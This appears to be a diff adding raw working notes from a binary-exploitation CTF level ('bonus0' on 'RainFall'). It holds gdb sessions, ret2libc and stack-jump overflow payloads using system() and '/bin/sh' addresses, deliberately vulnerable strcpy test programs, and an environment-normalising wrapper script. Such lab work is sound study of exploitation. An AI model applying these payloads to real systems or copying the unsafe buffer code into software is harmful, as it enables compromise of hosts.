@@ -1,0 +1,145 @@
+run with gdb giving 2 read in a raw : 
+(gdb )r < <(cat <(python -c "print 'A'*10") <(echo "ggggggggggggggggggggg"))
+in shell : 
+cat <(echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH")  <(python -c 'print "A" * 9 + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" +"\xb7\xf8\xcc\x58"[::-1]')  | ./bonus0
+
+
+1 pattern found.
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:	 "/bin/sh"
+
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+
+
+env -i SHELL=/bin/bash CMD=`/bin/echo -en "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"` gdb bonus0
+
+
+
+Starting program: /home/user/bonus0/bonus0 < <(/bin/cat <(/bin/echo "GGGGGGGGGGGGGGGGGGGGgggGGGGGGGGGGGGGGGGGGGGGGGGG") <(/bin/echo -e "AAAAAAAAA\xa9\xff\xff\xbfBBBBCCCC" ))
+ -
+ -
+GGGGGGGGGGGGGGGGGGGGAAAAAAAAA����BBBBCCC�� AAAAAAAAA����BBBBCCC��
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbfffffaa in ?? ()
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+int main(int ac, char ** av)
+{
+char buff[20];
+char bu[10];
+
+strcpy(bu, av[1]);
+printf("%s",bu);
+return (0);
+
+}
+
+
+
+
+#!/bin/sh
+
+while getopts "dte:h?" opt ; do
+  case "$opt" in
+    h|\?)
+      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
+      exit 0
+      ;;
+    t)
+      tty=1
+      gdb=1
+      ;;
+    d)
+      gdb=1
+      ;;
+    e)
+      env=$OPTARG
+      ;;
+  esac
+done
+
+shift $(expr $OPTIND - 1)
+prog=$(readlink -f $1)
+shift
+if [ -n "$gdb" ] ; then
+  if [ -n "$tty" ]; then
+    touch /tmp/gdb-debug-pty
+    exec env - $env SHELL=/bin/bash TERM=screen PWD=$PWD CODE=`/bin/echo -ne "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"` gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
+  else
+    exec env - $env SHELL=/bin/bash TERM=screen PWD=$PWD CODE=`/bin/echo -ne "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"` gdb --args $prog "$@"
+  fi
+else
+  exec env - $env SHELL=/bin/bash TERM=screen CODE=`/bin/echo -ne "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"` PWD=$PWD $prog "$@"
+fi
+
+
+
+
+
+
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(int ac, char **av)
+{
+char *str;
+char buf[20];
+char buff[20];
+char test[10];
+char * res = "coucou";
+
+str = NULL;
+read(0 ,buf, 14);
+printf(">%s<\n", buf);
+fflush(stdout);
+str = strchr(buf, '\n');
+printf("-%s-\n", str);
+fflush(stdout);
+read(0, buff, 30);
+str = strchr(buff, '\n');
+printf("##%s  &&  %s##\n", buf, buff);
+strcpy(test, buff);
+printf ("%s", test);
+return 0;
+}
+
+
+
+
+
+bonus0@RainFall:~$ env -i SHELL=/bin/bash CMD=`/bin/echo -en "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"` gdb bonus0
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+<GGGGGG") <(/bin/echo -e "AAAAAAAAA\xa9\xff\xff\xbfBBBBCCCC" ))
+Starting program: /home/user/bonus0/bonus0 < <(/bin/cat <(/bin/echo "GGGGGGGGGGGGGGGGGGGGgggGGGGGGGGGGGGGGGGGGGGGGGGG") <(/bin/echo -e "AAAAAAAAA\xa9\xff\xff\xbfBBBBCCCC" ))
+ -
+ -
+GGGGGGGGGGGGGGGGGGGGAAAAAAAAA����BBBBCCC�� AAAAAAAAA����BBBBCCC��
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbfffffaa in ?? ()
+
+
+
+
+
+
